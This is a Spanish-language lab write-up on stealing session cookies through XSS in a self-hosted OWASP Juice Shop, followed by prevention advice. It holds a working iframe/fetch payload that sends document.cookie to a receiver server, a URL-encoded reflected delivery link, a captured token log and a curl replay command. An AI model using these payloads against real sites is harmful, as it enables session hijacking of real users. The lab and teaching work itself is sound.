# Robo de cookies vía XSS y comparación de puntos de inyección en OWASP Juice Shop

**Entorno:** laboratorio propio, contenedor Docker de OWASP Juice Shop (`bkimminich/juice-shop`)
**Objetivo:** `http://10.0.2.15:3000`
**Categoría:** Cross-Site Scripting (exfiltración de sesión), comparación de superficie de ataque
**Fecha:** 24/11/2026

## Objetivo
Comprobar si el XSS ya confirmado en el buscador de productos (Lección 09) permite
robar la cookie de sesión real de un usuario, demostrar cómo se entregaría ese
ataque a una víctima sin que tenga que escribir nada, y comparar varios puntos de
entrada de la misma aplicación para ver cuáles están protegidos y cuáles no.

## Hallazgo 1: la cookie de sesión no tiene el flag `HttpOnly`
**Comprobación:** Firefox → F12 → Almacenamiento → Cookies → `http://10.0.2.15:3000`
→ columna `HttpOnly` de la cookie `token`.
**Resultado:** `false`.
**Impacto:** cualquier XSS explotable en esta aplicación permite leer esa cookie
desde JavaScript y exfiltrarla, sin necesitar la contraseña del usuario.

## Hallazgo 2: robo de cookie real, de extremo a extremo

**Procedimiento:**
1. Servidor receptor en Kali: `python3 -m http.server 4444`.
2. Payload en el buscador de productos:
   ```html
   <iframe src="javascript:fetch('http://10.0.2.15:4444/robo?c='+document.cookie)">
   ```
3. Al ejecutarse, el servidor receptor registró la petición entrante con la cookie
   completa en texto plano:
   ```
   10.0.2.15 - - [24/Nov/2026 12:52:36] "GET /robo?c=language=en;...
   token=eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLC...;...
   cookieconsent_status=dismiss HTTP/1.1" 404 -
   ```
   El `404` es esperado (esa ruta no existe en el servidor de prueba); lo relevante
   es que la petición llegó **con la JWT de sesión completa incluida**.

**Análisis:** esto demuestra el ataque completo, no solo la ejecución de un
`alert()`. Con ese token copiado, una petición `curl -H "Cookie: token=..."
http://10.0.2.15:3000/rest/user/whoami` desde cualquier otra máquina se habría
autenticado como la víctima sin conocer su contraseña.

## Hallazgo 3: construcción del enlace de entrega (reflejado)
El buscador refleja el parámetro en la URL (`/#/search?q=...`), así que el ataque
no necesita que la víctima escriba nada: basta con que haga clic en un enlace ya
construido con el payload dentro, codificado para que sobreviva al compartirlo:
```
http://10.0.2.15:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Afetch%28%27http%3A%2F%2F10.0.2.15%3A4444%2Frobo%3Fc%3D%27%2Bdocument.cookie%29%22%3E
```
**Prueba:** pegar ese enlace directamente en una ventana privada nueva (simulando
un usuario distinto que solo hace clic, sin usar el buscador) → la cookie llegó
igualmente al servidor receptor.

## Hallazgo 4: comparación de puntos de inyección (defensa inconsistente)
Se probó el mismo payload (`<iframe src="javascript:alert('XSS almacenado')">`) en
varios campos de la aplicación, inspeccionando el resultado en cada uno:

| Campo | Resultado observado | Interpretación |
|---|---|---|
| Buscador de productos | El código se ejecuta | Vulnerable: renderizado HTML sin sanitizar |
| Reseña de producto | Guardado como texto literal: `<p class="review-message">&lt;iframe src="javascript:alert('XSS almacenado')"&gt;</p>` | Protegido: Angular escapa el contenido por defecto en interpolación normal |
| Nombre de usuario (`/profile`) | El campo queda vacío tras guardar, no se refleja ningún valor | Esta ruta usa `POST /profile` → `302` → `GET /profile` (recarga completa del servidor, no es una llamada Angular/REST como el resto de la app); el valor parece rechazado por alguna validación de formato antes de persistirse |

## Análisis general
La misma aplicación trata de forma distinta cada punto de entrada: el buscador
confía en el dato del usuario y lo inyecta como HTML real; las reseñas pasan por
el escapado automático de Angular; y el formulario de perfil usa una ruta
tecnológicamente distinta (renderizado por servidor) que de momento no permitió
persistir el payload. Esto confirma que una auditoría seria no puede generalizar
"esta app tiene/no tiene XSS": hay que mapear y probar cada campo de entrada por
separado.

## Cómo se previene
- Activar **`HttpOnly`** en la cookie de sesión: corta por completo este vector de
  robo de cookie vía JavaScript, aunque exista XSS en otro punto.
- Añadir **`Secure`** y **`SameSite=Strict`/`Lax`** a la cookie como capas adicionales.
- Nunca usar inserción de HTML sin sanitizar (`innerHTML` o equivalentes) con datos
  de usuario; dejar que el framework escape el contenido por defecto, como ya hace
  en las reseñas.
- Aplicar la misma política de sanitización/validación en **todos** los puntos de
  entrada de la aplicación, incluidas rutas "antiguas" o renderizadas de forma
  distinta al resto (como el `/profile` visto aquí).
- Usar Content-Security-Policy como capa extra para limitar a qué dominios puede
  conectarse el JavaScript de la página, dificultando la exfiltración aunque exista XSS.

## Qué aprendí
Que un XSS sin más contexto no dice nada del impacto real: lo que importa es si la
cookie tiene `HttpOnly` o no, porque eso decide si el XSS se queda en un simple
`alert()` o se convierte en un robo de sesión completo. Monté mi propio servidor
receptor y vi la cookie real llegar en texto plano, lo cual deja mucho más claro
el riesgo que cualquier explicación teórica. También aprendí que un ataque
reflejado no necesita que la víctima escriba nada: basta con construir y codificar
un enlace y conseguir que alguien haga clic. Y, sobre todo, que probar un único
campo de una aplicación y generalizar el resultado es un error: cada campo puede
tener una defensa distinta, y encontrar esas inconsistencias es gran parte del
trabajo real de un auditor.

## Siguiente paso
Profundizar en control de acceso basado en roles y en cómo se auditan APIs REST de
forma más sistemática (Lección 11), posiblemente introduciendo herramientas de
escaneo automatizado (OWASP ZAP) como complemento al trabajo manual con Burp.
